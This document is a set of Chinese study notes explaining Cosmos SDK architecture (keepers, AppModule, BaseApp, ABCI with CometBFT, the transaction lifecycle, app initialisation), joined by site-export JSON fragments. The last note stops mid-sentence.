不成熟的智能合约语言以及不安全的虚拟机\n基于对象能力模型设计思想，使得cosmos sdk 提供了一个非常安全的环境\n\n\n\n\ncosmos sdk 架构设计\n开发者可以直接复用Cosmos-SDK提供的功能模块，也可以基于业务需求实现新的功能模块。每个模块都有自己的存储空间，并可以定义新的消息和相应的处理逻辑。一个消息对应一个链上操作，而一笔交易中可以包含多个消息。从模块化设计的视角来看，一个区块链应用的状态被拆解到多个模块中，每个模块单独管理自己的存储空间，并通过适当的方式与其他模块实现交互。模块的代码组织如下(nft为例)：\nnft\n├── CHANGELOG.md\n├── README.md\n├── client\n│   └── cli // 本模块支持的命令行方法和REST方法\n│       ├── tx.go // 从命令行构建本模块支持的交易请求\n│       └── tx_test.go \n├── codec.go\n├── errors.go\n├── event.pb.go\n├── expected_keepers.go\n├── genesis.go // 导入模块的初始状态以及导出模块的状态\n├── genesis.pb.go\n├── go.mod\n├── go.sum\n├── internal\n│   └── conv\n│       ├── doc.go\n│       ├── string.go\n│       └── string_test.go\n├── keeper \n│   ├── class.go\n│   ├── genesis.go\n│   ├── grpc_query.go\n│   ├── grpc_query_test.go\n│   ├── keeper.go // 本模块的子存储空间的读写功能\n│   ├── keeper_test.go\n│   ├── keys.go\n│   ├── msg_server.go // 消息处理\n│   ├── msg_server_test.go\n│   ├── nft.go\n│   ├── nft_batch.go\n│   └── nft_batch_test.go\n├── keys.go\n├── module\n│   ├── autocli.go\n│   └── module.go  // 实现AppModule接口\n├── msgs.go\n├── nft.pb.go\n├── query.pb.go\n├── query.pb.gw.go\n├── simulation // 模糊测试相关代码\n│   ├── decoder.go\n│   ├── decoder_test.go\n│   ├── genesis.go\n│   ├── genesis_test.go\n│   ├── operations.go\n│   └── operations_test.go\n├── sonar-project.properties\n├── testutil\n│   ├── app_config.go\n│   └── expected_keepers_mocks.go\n└── tx.pb.go\nkeeper\nKeepers指的是Cosmos SDK抽象，其作用是管理对各种模块定义的状态子集的访问(对存储看门的)。keeper是特定于模块的，即模块定义的状态子集只能由所述模块中定义的keeper访问。如果一个模块需要访问由另一个模块定义的状态子集，则需要将对第二个模块的内部保持器的引用传递给第一个模块。\n类型定义如下：\ntype Keeper struct {\n    // External keepers, if any （引用的外部keeper）\n\t\n    // Store key(s) // storeKeys授予对模块管理的多存储的存储的访问权限。它们应始终不暴露于外部模块\n \n    // codec 编解码器，默认protobuf\n \n    // authority  \n}\nAppModule\nbaseApp通过AppModule接口来统一管理所有模块，其又拆分为AppModuleBasic、AppModuleGenesis、AppModule。\ntype AppModule interface {\n\tAppModuleGenesis\n  \n\tRegisterInvariants(sdk.InvariantRegistry)\n \n  // 注册消息服务以及查询服务以响应客户端特定请求🚩\n\tRegisterServices(Configurator)\n  \n\tConsensusVersion() uint64\n}\n \nAppModuleBasic接口定义了应用程序的基础功能，编码注册，Grpc网关路由注册🚩， 交易以及查询命令获取\ntype AppModuleBasic interface {\n\tName() string\n\tRegisterLegacyAminoCodec(*codec.LegacyAmino)\n\tRegisterInterfaces(codectypes.InterfaceRegistry)\n \n\tDefaultGenesis(codec.JSONCodec) json.RawMessage\n\tValidateGenesis(codec.JSONCodec, client.TxEncodingConfig, json.RawMessage) error\n \n\t// 将RESTful API 快速转换为 gRPC 服务\n\tRegisterGRPCGatewayRoutes(client.Context, *runtime.ServeMux)\n\tGetTxCmd() *cobra.Command\n\tGetQueryCmd() *cobra.Command\n}\nAppModuleBasic和keeper以及AppModule 三者关系如下：\n+------------------------------------------------+\n|     \t\t\t\t\t\t AppModule    \t\t\t\t\t\t\t\t |\n+------------------------------------------------+\n        |      \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t |\n        |     \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t |\n        v     \t\t\t\t\t\t\t\t\t\t\t\t\t\t   v\n+---------------------+     +---------------------+\n|    AppModuleGenesis |     |        keeper     \t|\n+---------------------+     +---------------------+\n \t\t\t\t|      \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t \n        |     \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n        v \n+---------------------+     \n|    AppModuleBasic |    \n+---------------------+    \n \n \nmoduleManager\nCosmos-SDK的每个功能模块都以AppModule接口的形式暴露给应用。为了方便应用对各个模块的管理，Cosmos-SDK提供了模块管理器，有两种类型的模块管理器，一个用来管理模块实现的AppModuleBasic接口功能；一个用来管理模块在AppModuleBasic之外的AppModule接口功能。应用所需的模块都需要注册到这两个模块管理器中，具体定义如下：\ntype App struct {\n\t*baseapp.BaseApp\n \n\tModuleManager     *module.Manager\n\t...\n\tbasicManager      module.BasicManager\n}\ntype Manager struct {\n\tModules                  map[string]interface{} // interface{} is used now to support the legacy AppModule as well as new core appmodule.AppModule.\n\tOrderInitGenesis         []string\n\tOrderExportGenesis       []string\n\tOrderBeginBlockers       []string\n\tOrderEndBlockers         []string\n\tOrderPrepareCheckStaters []string\n\tOrderPrecommiters        []string\n\tOrderMigrations          []string\n}\ntype BasicManager map[string]AppModuleBasic\n模块管理器的引入简化了应用对于模块的管理，应用只需要在初始化时设置好模块管理器这个成员变量，随后与模块的交互都通过该模块管理器来进行即可。例如，当应用接收到ABCI对RequestBeginBlock的请求时，只需要调用模块管理器的BeginBlock()方法，该方法会按照指定的顺序依次调用各个模块的BeginBlock()方法。模块管理器架起了顶层应用与底层模块之间沟通的桥梁.\nbaseApp\nbaseapp是Cosmos SDK应用程序的样板实现。它附带了ABCI的实现，以处理与底层共识引擎的连接，同时，BaseApp负责对各模块进行管理，包括响应ABCI请求、转发，消息和查询请求给各模块、管理各模块的初始状态和状态转移。\ntype BaseApp struct {\n\t// initialized on creation\n\tlogger            log.Logger\n\tname              string                      // application name from abci.BlockInfo\n\tdb                dbm.DB                      // common DB backend\n\tcms               storetypes.CommitMultiStore // Main (uncached) state\n\tqms               storetypes.MultiStore       // Optional alternative multistore for querying only.\n\tstoreLoader       StoreLoader                 // function to handle store loading, may be overridden with SetStoreLoader()\n\tgrpcQueryRouter   *GRPCQueryRouter            // router for redirecting gRPC query calls\n\tmsgServiceRouter  *MsgServiceRouter           // router for redirecting Msg service messages\n\tinterfaceRegistry codectypes.InterfaceRegistry\n\ttxDecoder         sdk.TxDecoder // unmarshal []byte into sdk.Tx\n\ttxEncoder         sdk.TxEncoder // marshal sdk.Tx into []byte\n \n\tmempool            mempool.Mempool            // application side mempool\n\tanteHandler        sdk.AnteHandler            // ante handler for fee and auth\n\tpostHandler        sdk.PostHandler            // post handler, optional, e.g. for tips\n\tinitChainer        sdk.InitChainer            // initialize state with validators and state blob\n\tbeginBlocker       sdk.BeginBlocker           // logic to run before any txs\n\tprocessProposal    sdk.ProcessProposalHandler // the handler which runs on ABCI ProcessProposal\n\tprepareProposal    sdk.PrepareProposalHandler // the handler which runs on ABCI PrepareProposal\n\tendBlocker         sdk.EndBlocker             // logic to run after all txs, and to determine valset changes\n\tprepareCheckStater sdk.PrepareCheckStater     // logic to run during commit using the checkState\n\tprecommiter        sdk.Precommiter            // logic to run during commit using the deliverState\n\taddrPeerFilter     sdk.PeerFilter             // filter peers by address and port\n\tidPeerFilter       sdk.PeerFilter             // filter peers by node ID\n\tfauxMerkleMode     bool                       // if true, IAVL MountStores uses MountStoresDB for simulation speed.\n \n\t// manages snapshots, i.e. dumps of app state at certain intervals\n\tsnapshotManager *snapshots.Manager\n \n\t// volatile states:\n\t//\n\t// checkState is set on InitChain and reset on Commit\n\t// deliverState is set on InitChain and BeginBlock and set to nil on Commit\n\tcheckState           *state // for CheckTx\n\tdeliverState         *state // for DeliverTx\n\tprocessProposalState *state // for ProcessProposal\n\tprepareProposalState *state // for PrepareProposal\n \n\t// an inter-block write-through cache provided to the context during deliverState\n\tinterBlockCache storetypes.MultiStorePersistentCache\n \n\t// paramStore is used to query for ABCI consensus parameters from an\n\t// application parameter store.\n\tparamStore ParamStore\n \n\t// The minimum gas prices a validator is willing to accept for processing a\n\t// transaction. This is mainly used for DoS and spam prevention.\n\tminGasPrices sdk.DecCoins\n \n\t// initialHeight is the initial height at which we start the baseapp\n\tinitialHeight int64\n \n\t// flag for sealing options and parameters to a BaseApp\n\tsealed bool\n \n\t// block height at which to halt the chain and gracefully shutdown\n\thaltHeight uint64\n \n\t// minimum block time (in Unix seconds) at which to halt the chain and gracefully shutdown\n\thaltTime uint64\n \n\t// minRetainBlocks defines the minimum block height offset from the current\n\t// block being committed, such that all blocks past this offset are pruned\n\t// from CometBFT. It is used as part of the process of determining the\n\t// ResponseCommit.RetainHeight value during ABCI Commit. A value of 0 indicates\n\t// that no blocks should be pruned.\n\t//\n\t// Note: CometBFT block pruning is dependant on this parameter in conjunction\n\t// with the unbonding (safety threshold) period, state pruning and state sync\n\t// snapshot parameters to determine the correct minimum value of\n\t// ResponseCommit.RetainHeight.\n\tminRetainBlocks uint64\n \n\t// application&#039;s version string\n\tversion string\n \n\t// application&#039;s protocol version that increments on every upgrade\n\t// if BaseApp is passed to the upgrade keeper&#039;s NewKeeper method.\n\tappVersion uint64\n \n\t// recovery handler for app.runTx method\n\trunTxRecoveryMiddleware recoveryMiddleware\n \n\t// trace set will return full stack traces for errors in ABCI Log field\n\ttrace bool\n \n\t// indexEvents defines the set of events in the form {eventType}.{attributeKey},\n\t// which informs CometBFT what to index. If empty, all events will be indexed.\n\tindexEvents map[string]struct{}\n \n\t// streamingManager for managing instances and configuration of ABCIListener services\n\tstreamingManager storetypes.StreamingManager\n \n\tchainID string\n}\nbaseApp主要有以下几类成员：\n\n基本的日志和存储功能\nABCI相关\n\ntxDecoder解码 checktx 以及 diliverTx 接收的交易\ninitChainer、beginBlocker、endBlocker用来响应特定的ABCI请求\ncheckState和deliverState分别对应交易池连接和共识连接方法所依赖的临时应用状态和上下文环境。\n\n\nanteHandler: 交易预处理操作，签名验证，gas检查等\n\nApp 和 cometBFT 如何通信\nCometBFT通过一个名为ABCI的接口将事务传递给App，app必须实现ABCI。\n              +---------------------+\n              |                     |\n              |     Application     |\n              |                     |\n              +--------+---+--------+\n                       ^   |\n                       |   | ABCI\n                       |   v\n              +--------+---+--------+\n              |                     |\n              |                     |\n              |       CometBFT      |\n              |                     |\n              |                     |\n              +---------------------+\nCometBFT 只处理事务字节。它不知道这些字节的含义。CometBFT 所做的只是确定性地对这些事务字节进行排序。CometBFT 通过 ABCI 将字节传递给应用程序，并期望返回代码通知它事务中包含的消息是否被成功处理。\nABCI有以下几个关键消息：\n\nCheckTx：当CometBft收到交易时，通过checkTx将传递给应用程序，以检查是否满足了一些基本要求\nDeliverTx：当CometBFT接收到有效块时，块中的每个事务都会通过DeliverTx传递给应用程序以便进行处理。正是在这个阶段，状态转换才会发生。\nBeginBlock/EndBlock:这些消息在每个块的开始和结束时执行，无论块是否包含事务。将会触发自动执行逻辑。\n\n更多细节查看 cometBFT 文档 ABCI\nABCI\nTendermint core 根据分层设计理念将区块链应用分成3层：p2p通信层、共识协议层以及上层应用层。Tendermint core 提供p2p通信以及共识协议实现，并定义了通用的ABCI与上层应用交互，跟上层应用交互时，Tendermint core 作为客户端发起ABCI请求, 上层应用作为服务端进行响应。交互方式支持GRPC、Socket以及进程内交互(基于go开发的sdk).\n「tendermint客户端和上层APP交互」\ntendermint core 设计了 ABCI client, ABCI Server和Application，跟上层应用交互时，Tendermint core 作为客户端向ABCI Server发起ABCI请求, ABCI Server将请求转发给实现了Application接口的上层应用进行处理。上层应用实现了Application接口和ABCI Server， ABCI提供3种ABCI客户端，localClient和grpcClient以及socketClient， localClient可以直接调用上层应用的ABCI方法，不需要ABCI Server.\nTODO：再具体的需要研究下tendermint底层 🚩\n一笔交易如何完成生命周期\n创建交易\n用户可以通过命令行接口来创建交易，如下：\n[appname] tx [command] [args] [flags]\n添加到mempool\n每个接收Tx的完整节点（运行CometBFT）都会向应用层发送一条ABCI消息CheckTx，以检查其有效性，并接收一条ABCI.ResponseCheckTx。如果Tx通过检查，它将保存在节点的Mempool中，等待打包， 如果发现Tx无效，则诚实节点会丢弃它。\n解码交易\n当应用程序从底层共识引擎（例如CometBFT）接收到Tx时，它仍然是其编码的[]字节形式，需要解码才能进行处理。\n交易基本检查\n通过anteHandler 进行签名验证，gas 等检查\n将交易包含在一个区块中\nproposer打包交易进区块，此时的交易是有序的\n状态改变\n达成共识的下一步是执行事务以完全验证它们。所有从正确的提议者那里接收到块提议的完整节点都通过调用ABCI函数BeginBlock、每个事务的DeliverTx和EndBlock来执行事务。虽然每个完整节点都在本地运行所有内容，但由于消息的状态转换是确定性的，并且事务在块建议中是明确排序的，因此该过程会产生一个单一的、明确的结果。\n        -----------------------\n        |Receive Block Proposal|\n        -----------------------\n                  |\n              v\n        -----------------------\n        | BeginBlock          |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | DeliverTx(tx0)      |\n        | DeliverTx(tx1)      |\n        | DeliverTx(tx2)      |\n        | DeliverTx(tx3)      |\n        |   .         |\n        |   .         |\n        |   .         |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | EndBlock        |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | Consensus       |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | Commit          |\n        -----------------------\nDiliverTx完成了大部分的状态转换，顺序的执行块中的每个事务，其大概做了以下事情\n\n\n解码事务\n\n\n通过validateBasic和anteHandler执行相关的校验\n\n\nMsgServicerouter会在app中注册相应的handler，所以通过了校验之后会根据runmsgs去路由到相关的handler去处理消息\nhandler := app.MsgServiceRouter().Handler(msg)\nmsgResult, err := handler(app.ctx, msg)\n\n\nmsg service: Protobuf-Msg server负责执行Tx中的每个消息，并改变diliver state\n\n\ncommit\nValidator节点执行交易进行状态改变，然后对块进行签名以进行确认。最后一步是节点提交块和状态更改。\n当他们收到足够的验证器投票（2/3+按投票权加权的预提交）时，完整的节点提交到要添加到区块链的新块，并在应用层中完成状态转换。生成一个新的状态根，作为状态转换的merkle证明。应用程序使用从Baseapp继承的Commit ABCI方法；它通过将deliveryState写入应用程序的内部状态来同步所有状态转换。一旦提交了状态更改，checkState就会从最近提交的状态重新开始，deliveryState会重置为nil，以保持一致并反映更改。\n此时，Tx的事务生命周期已经结束：节点已经验证了它的有效性，通过执行状态更改来传递它，并提交这些更改。\ntendermint :\nExecCommitBlock -&gt; CommitSync -&gt; app.Application.Commit()\n \ncosmos sdk:\nfunc (app *BaseApp) Commit() abci.ResponseCommit {\n  ...\n  app.setState(runTxModeCheck, header)\n}\n基于cosmos sdk 构建的知名项目\nDefi\n\n\nOsmosis: Osmosis 允许用户在不同的区块链之间交换代币和流动性。它支持多种流动性池，例如 AMM (自动做市商)、定向流动性和资本池等。用户可以通过提供流动性和交易费用来赚取收益，并参与 Osmosis 生态系统的治理和发展。\n\n\nBinance chain ：Binance Chain 是由 Binance 推出的一个专为去中心化交易所 (DEX) 设计的区块链\n\n\nterra ：Terra 是一个稳定币生态系统，它由多个与法定货币挂钩的稳定币组成，例如 TerraUSD (UST) 稳定币和 TerraKRW (KRT) 稳定币。Terra 使用 Cosmos SDK 和 Tendermint 共识机制构建。\n\n\n智能合约平台\n\nEvmos： Evmos 支持以太坊的智能合约和 ERC20 代币，同时也支持 Cosmos SDK 的模块。\n\n跨链\n\nGravity Bridge： Gravity Bridge 基于 IBC (Inter-Blockchain Communication) 协议，它允许不同的区块链之间进行安全、可靠、无信任的跨链通信\n\nLayer2\n\nCelestia: 模块化区块链，cosmos 的二层网络，作为基于cosmos sdk开发的应用链的DA层\n\n预言机\n\nBand Protocol: 是一个去中心化预言机协议，它通过提供可靠、高效、安全的数据源，使得区块链应用可以获取和验证现实世界的数据。它具有去中心化、可扩展性、多链支持和稳定性等特性，为区块链生态系统提供了重要的数据服务\n\n与cosmos sdk类似的设计\n\nSubstrate：Substrate 是一个基于 Rust 语言的区块链框架，由 Parity Technologies 开发。它采用了模块化的设计理念，使得开发者可以根据自己的需求选择和组合不同的模块，从而快速构建自己的区块链应用。Substrate 支持多种共识机制、智能合约语言和网络协议，具有高度的可扩展性和安全性。\nNEAR Protocol：NEAR Protocol 是一个基于 Rust 语言的公共区块链平台，它采用了类似于 Cosmos SDK 的模块化设计理念。NEAR Protocol 支持多种共识机制和智能合约语言，具有高度的可扩展性和安全性。\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/cosmos_baseApp":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/cosmos_baseApp","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos sdk/cosmos_baseApp.md","title":"cosmos_baseApp","links":[],"tags":[],"content":"baseapp 实现了 cometBFT定义的接口：\ntype Application interface {\n\t// Info/Query Connection\n\tInfo(RequestInfo) ResponseInfo    // Return application info\n\tQuery(RequestQuery) ResponseQuery // Query for state\n \n\t// Mempool Connection\n\tCheckTx(RequestCheckTx) ResponseCheckTx // Validate a tx for the mempool\n \n\t// Consensus Connection\n\tInitChain(RequestInitChain) ResponseInitChain // Initialize blockchain w validators/other info from CometBFT\n\tPrepareProposal(RequestPrepareProposal) ResponsePrepareProposal\n\tProcessProposal(RequestProcessProposal) ResponseProcessProposal\n\tBeginBlock(RequestBeginBlock) ResponseBeginBlock // Signals the beginning of a block\n\tDeliverTx(RequestDeliverTx) ResponseDeliverTx    // Deliver a tx for full processing\n\tEndBlock(RequestEndBlock) ResponseEndBlock       // Signals the end of a block, returns changes to the validator set\n\tCommit() ResponseCommit                          // Commit the state and return the application Merkle root hash\n \n\t// State Sync Connection\n\tListSnapshots(RequestListSnapshots) ResponseListSnapshots                // List available snapshots\n\tOfferSnapshot(RequestOfferSnapshot) ResponseOfferSnapshot                // Offer a snapshot to the application\n\tLoadSnapshotChunk(RequestLoadSnapshotChunk) ResponseLoadSnapshotChunk    // Load a snapshot chunk\n\tApplySnapshotChunk(RequestApplySnapshotChunk) ResponseApplySnapshotChunk // Apply a shapshot chunk\n}\nbaseapp的结构：\ntype BaseApp struct {\n\t// initialized on creation\n\tlogger            log.Logger\n\tname              string                      // application name from abci.BlockInfo\n\tdb                dbm.DB                      // common DB backend\n\tcms               storetypes.CommitMultiStore // Main (uncached) state\n\tqms               storetypes.MultiStore       // Optional alternative multistore for querying only.\n\tstoreLoader       StoreLoader                 // function to handle store loading, may be overridden with SetStoreLoader()\n\tgrpcQueryRouter   *GRPCQueryRouter            // router for redirecting gRPC query calls\n\tmsgServiceRouter  *MsgServiceRouter           // router for redirecting Msg service messages\n\tinterfaceRegistry codectypes.InterfaceRegistry\n\ttxDecoder         sdk.TxDecoder // unmarshal []byte into sdk.Tx\n\ttxEncoder         sdk.TxEncoder // marshal sdk.Tx into []byte\n \n\tmempool            mempool.Mempool            // application side mempool\n\tanteHandler        sdk.AnteHandler            // ante handler for fee and auth\n\tpostHandler        sdk.PostHandler            // post handler, optional, e.g. for tips\n\tinitChainer        sdk.InitChainer            // initialize state with validators and state blob\n\tbeginBlocker       sdk.BeginBlocker           // logic to run before any txs\n\tprocessProposal    sdk.ProcessProposalHandler // the handler which runs on ABCI ProcessProposal\n\tprepareProposal    sdk.PrepareProposalHandler // the handler which runs on ABCI PrepareProposal\n\tendBlocker         sdk.EndBlocker             // logic to run after all txs, and to determine valset changes\n\tprepareCheckStater sdk.PrepareCheckStater     // logic to run during commit using the checkState\n\tprecommiter        sdk.Precommiter            // logic to run during commit using the deliverState\n\taddrPeerFilter     sdk.PeerFilter             // filter peers by address and port\n\tidPeerFilter       sdk.PeerFilter             // filter peers by node ID\n\tfauxMerkleMode     bool                       // if true, IAVL MountStores uses MountStoresDB for simulation speed.\n \n\t// manages snapshots, i.e. dumps of app state at certain intervals\n\tsnapshotManager *snapshots.Manager\n \n\t// volatile states:\n\t//\n\t// checkState is set on InitChain and reset on Commit\n\t// deliverState is set on InitChain and BeginBlock and set to nil on Commit\n\tcheckState           *state // for CheckTx\n\tdeliverState         *state // for DeliverTx\n\tprocessProposalState *state // for ProcessProposal\n\tprepareProposalState *state // for PrepareProposal\n \n\t// an inter-block write-through cache provided to the context during deliverState\n\tinterBlockCache storetypes.MultiStorePersistentCache\n \n\t// paramStore is used to query for ABCI consensus parameters from an\n\t// application parameter store.\n\tparamStore ParamStore\n \n\t// The minimum gas prices a validator is willing to accept for processing a\n\t// transaction. This is mainly used for DoS and spam prevention.\n\tminGasPrices sdk.DecCoins\n \n\t// initialHeight is the initial height at which we start the baseapp\n\tinitialHeight int64\n \n\t// flag for sealing options and parameters to a BaseApp\n\tsealed bool\n \n\t// block height at which to halt the chain and gracefully shutdown\n\thaltHeight uint64\n \n\t// minimum block time (in Unix seconds) at which to halt the chain and gracefully shutdown\n\thaltTime uint64\n \n\t// minRetainBlocks defines the minimum block height offset from the current\n\t// block being committed, such that all blocks past this offset are pruned\n\t// from CometBFT. It is used as part of the process of determining the\n\t// ResponseCommit.RetainHeight value during ABCI Commit. A value of 0 indicates\n\t// that no blocks should be pruned.\n\t//\n\t// Note: CometBFT block pruning is dependant on this parameter in conjunction\n\t// with the unbonding (safety threshold) period, state pruning and state sync\n\t// snapshot parameters to determine the correct minimum value of\n\t// ResponseCommit.RetainHeight.\n\tminRetainBlocks uint64\n \n\t// application&#039;s version string\n\tversion string\n \n\t// application&#039;s protocol version that increments on every upgrade\n\t// if BaseApp is passed to the upgrade keeper&#039;s NewKeeper method.\n\tappVersion uint64\n \n\t// recovery handler for app.runTx method\n\trunTxRecoveryMiddleware recoveryMiddleware\n \n\t// trace set will return full stack traces for errors in ABCI Log field\n\ttrace bool\n \n\t// indexEvents defines the set of events in the form {eventType}.{attributeKey},\n\t// which informs CometBFT what to index. If empty, all events will be indexed.\n\tindexEvents map[string]struct{}\n \n\t// streamingManager for managing instances and configuration of ABCIListener services\n\tstreamingManager storetypes.StreamingManager\n \n\tchainID string\n}"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/cosmos_grpc":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/cosmos_grpc","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos sdk/cosmos_grpc.md","title":"cosmos_grpc","links":[],"tags":[],"content":""},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/cosmos_init":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/cosmos_init","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos sdk/cosmos_init.md","title":"cosmos_init","links":[],"tags":[],"content":"Newrootcmd-newApp→app.new\nApp.new 做的事情:\n\n\nCodec 创建\n\n\ninterfaceRegistry 创建 🚩\n\n\nbaseapp创建\n\n存储创建包括db,以及CommitMultiStore\n定义模块路由器，包含本机查询路由以及本机消息服务处理路由和grpc消息服务以及grpc消息处理路由\n\n\n\n创建目前的kvstorekeys\n\n\n初始化paramskeeper🚩\n\n\nadd capability keeper and ScopeToModule for ibc module 🚩\n\n\n添加各个模块的keeper\n\n\n创建模块管理器\n\n\napp.mm.SetOrderBeginBlockers\n\n\napp.mm.SetOrderEndBlockers\n\n\napp.mm.SetOrderInitGenesis\n\n\n通过模块管理器注册所有模块的不变量，如果某些值变了可能会触发链停\n\n\n注册消息路由和查询路由，目前已经废弃掉了，使用RegisterServices\n\n\n创建模块管理器配置器，配置msgServer和queryServer🚩\n\n\n通过模块管理器注册所有模块的服务\n\n\n注册服务包括两个，一个是消息服务，一个是查询服务\n// 第一个参数是服务定义（切片），第二个就是handlers，也就是对应的msgServer里面的定义个各个实现\ntypes.RegisterMsgServer(cfg.MsgServer(), keeper.NewMsgServerImpl(am.keeper))\ntypes.RegisterQueryServer(cfg.QueryServer(), am.keeper)\n\n\n\n\n创建 SimulationManager\n\n\n初始化存储\n\n\n初始化Baseapp\n\napp.SetInitChainer(app.InitChainer)\napp.SetBeginBlocker(app.BeginBlocker)\napp.SetAnteHandler(anteHandler)\n\n\n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/cosmos_search":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/cosmos_search","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos sdk/cosmos_search.md","title":"cosmos_search","links":[],"tags":[],"content":"\n\n面向对象模型思考：Object-Capability Model | Cosmos SDK\n\n\nABCI 允许替换共识，目前只有cometBFT\n\n\n开发人员可以自由探索各种权衡（例如，验证器的数量与事务吞吐量、异步中的安全性与可用性等）和设计选择（用于存储的DB或IAVL树、UTXO或帐户模型等） ？？\n\n\n开发人员可以实现代码的自动执行。在Cosmos SDK中，逻辑可以在每个块的开始和结束时自动触发。他们还可以自由选择应用程序中使用的加密库，而不是在虚拟机区块链的情况下受到底层环境的限制 ？？\n\n\n开发人员不受底层虚拟机提供的加密功能的约束。他们可以使用自己的自定义密码，并依赖于经过良好审计的加密库。\n\n\n特定应用程序区块链的主要好处之一是主权。去中心化的应用程序是一个涉及许多参与者的生态系统：用户、开发人员、第三方服务等等。当开发者在许多去中心化应用共存的虚拟机区块链上构建时，应用程序的社区与底层区块链的社区不同，后者在治理过程中取代前者。如果出现错误或需要新功能，应用程序的利益相关者几乎没有升级代码的余地。如果底层区块链的社区拒绝采取行动，什么都不会发生。\n这里的根本问题是应用程序的治理和网络的治理不一致。这个问题可以通过特定于应用程序的区块链来解决。由于特定于应用程序的区块链专门用于操作单个应用程序，因此应用程序的利益相关者可以完全控制整个链。这确保了如果发现漏洞，社区不会陷入困境，并且可以自由选择如何发展。\n\n\nApplication-Specific Blockchains\n                ^  +-------------------------------+  ^\n                |  |                               |  |   Built with Cosmos SDK\n                |  |  State-machine = Application  |  |\n                |  |                               |  v\n                |  +-------------------------------+\n                |  |                               |  ^\nBlockchain node |  |           Consensus           |  |\n                |  |                               |  |\n                |  +-------------------------------+  |   CometBFT\n                |  |                               |  |\n                |  |           Networking          |  |\n                |  |                               |  |\n                v  +-------------------------------+  v\ncometBFT\nCometBFT共识算法使用一组称为Validators的特殊节点。验证器负责将交易块添加到区块链中。在任何给定的块上，都有一个验证器集V。算法选择V中的验证器作为下一个块的提议者。如果超过三分之二的V在其上签署了prevote和precommit，并且它包含的所有事务都是有效的，则该块被认为是有效的。验证程序集可以通过在状态机中编写的规则进行更改?????。\nABCI\n参考bc_architecture\nAPP types\n\nbaseApp:baseapp implements most of the core logic for the application, including all the ABCI methods and the routing logic.\nA list of store keys: Each module uses one or multiple stores in the multistore to persist their part of the state. These stores can be accessed with specific keys that are declared in the app type.\nA list of module’s keepers：which handles reads and writes for this module’s store(s)\nAppcodec:used to serialize and deserialize data structures in order to store them, as stores can only persist []bytes. The default codec is Protocol Buffers.\nMoudle manager:The module manager is an object that contains a list of the application’s modules.like registering their Msg service and gRPC Query service, or setting the order of execution between modules for various functions like InitChainer, BeginBlocker and EndBlocker.\n\nnewSimApp\n[initchainer]: 由cometbft 发到App里的消息，主要用来调用各个模块的Initgenesis 函数。\nmoudles\n[Application Module Interface]:需要实现AppModuleBasic and AppModule\n{diliver tx}: 节点收到有效块，然后cometBFT 通过diliver tx 传给app 去处理，然后1 decode, 2,validate tx , 3 route to module\n一般会在tx.proto中定义自己的Msg服务。\n{gRPC Query Services}: 了解grpc原理 🚩， rest路由\nTransaction Lifecycle\n\n\n可以指定超时高度\n\n\n由cometbft 发送check tx 给app去检查交易是否正确\n\n\n[antehandler]:\n\n\nAnteHandlers: 实践中经常用于执行签名验证、气体计算、费用扣除和其他与区块链交易相关的核心操作。\n例如，身份验证模块AnteHandler检查并递增序列号，检查签名和帐号，并从交易的第一个签名者那里扣除费用——所有状态更改都是使用checkState进行的\n\n\n「mempool」:验证器节点保留一个内存池以防止重放攻击，就像完整节点一样，但也将其用作未经确认的事务池，为包含块做准备。请注意，即使Tx在这个阶段通过了所有检查，以后仍有可能被发现无效，因为CheckTx并没有完全验证事\n「state chhange 」:\n达成共识的下一步是执行事务以完全验证它们。所有从正确的提议者那里接收到块提议的完整节点都通过调用ABCI函数BeginBlock、每个事务的DeliverTx和EndBlock来执行事务。虽然每个完整节点都在本地运行所有内容，但由于消息的状态转换是确定性的，并且事务在块建议中是明确排序的，因此该过程会产生一个单一的、明确的结果。\n        -----------------------\n        |Receive Block Proposal|\n        -----------------------\n                  |\n              v\n        -----------------------\n        | BeginBlock          |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | DeliverTx(tx0)      |\n        | DeliverTx(tx1)      |\n        | DeliverTx(tx2)      |\n        | DeliverTx(tx3)      |\n        |   .         |\n        |   .         |\n        |   .         |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | EndBlock        |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | Consensus       |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | Commit          |\n        -----------------------\n「deliever tx」:\n\n解码事务\nChecks和AnteHandler : 事务检查\nMsgServiceRouter： 消息路由到指定模块的处理器\nmsg service： Protobuf-Msg服务负责执行Tx中的每个消息，并使状态转换持续到deliveryTxState ？？\nPosthandler:PostHandlers在消息执行之后运行。如果失败，那么runMsgs和PostHandlers的状态更改都将被恢复\nGasMeter: 跟踪交易执行所需要的气体\n\n「commIt」：\n最后一步是节点提交块和状态更改。Validator节点执行执行状态转换的前一步，以验证事务，然后对块进行签名以进行确认。非Validator的完整节点不参与共识，即他们不能投票，但会听取投票，以了解他们是否应该提交状态更改。\n当他们收到足够的验证器投票（2/3+按投票权加权的预提交）时，完整的节点提交到要添加到区块链的新块，并在应用层中完成状态转换。生成一个新的状态根，作为状态转换的merkle证明。应用程序使用从Baseapp继承的Commit 